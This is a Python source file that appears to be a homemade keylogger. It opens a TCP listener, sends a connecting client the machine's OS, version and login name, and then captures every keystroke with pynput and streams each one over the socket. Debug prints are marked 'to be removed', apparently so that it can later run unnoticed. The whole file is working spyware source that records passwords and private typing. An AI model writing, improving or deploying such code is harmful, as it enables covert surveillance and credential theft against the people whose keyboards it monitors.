import platform,os,socket
from anyio import wait_socket_readable
from pynput import keyboard
from pynput.keyboard import Listener , Key

def C_server(ip,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print('Socket has been created\n')# to be removed
    try:
        sock.bind((ip, port))
        print('host Succesfully binded !\n')# to be removed
    except Exception as err:
        print ('Binding has failed. Error Code is : ',err)# to be removed
        exit()

    return sock

def conn_hundler(sock):
    try :    
        sock.listen(1)
        connection_infos ,(client_host, client_port) = sock.accept()
        print(f'Connection From: {client_host} on Port {client_port}\n')# to be removed
        connection_infos.sendall(f" Your Connected to a : {platform.uname().system} && version : {platform.uname().version} && User : {os.getlogin( )} \n".encode())

    except Exception as e :
        print('failed to listen ! : '+e)# to be removed

    return connection_infos

def Sender(remote_host,data):
    try : 
        remote_host.sendall(data.encode())
        return True
    except Exception as e : 
        print(f'Error While Sending :{e} ')# to be removed

def on_press(key):
    pr_key = str(key)
    if type(key) != type(Key.esc):
        print(f" pressed : {pr_key} \n")
        Sender(remote_host,pr_key)
    if key == Key.enter:
        Sender(remote_host,' \n ')   
        print(f" pressed : {pr_key} \n")
    if type(key) == type(Key.esc): 
        Sender(remote_host,' '+pr_key+' ')   
        print(f" pressed : {pr_key} \n")
         
    return True    

def on_release(key):
    if key == Key.esc:
        exit()

def wait_for_user_input():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join() # wait till listener will stop
    # other stuff 

remote_host = conn_hundler(C_server('127.0.0.1',8083)) # to be used in on_press func

print(wait_for_user_input())
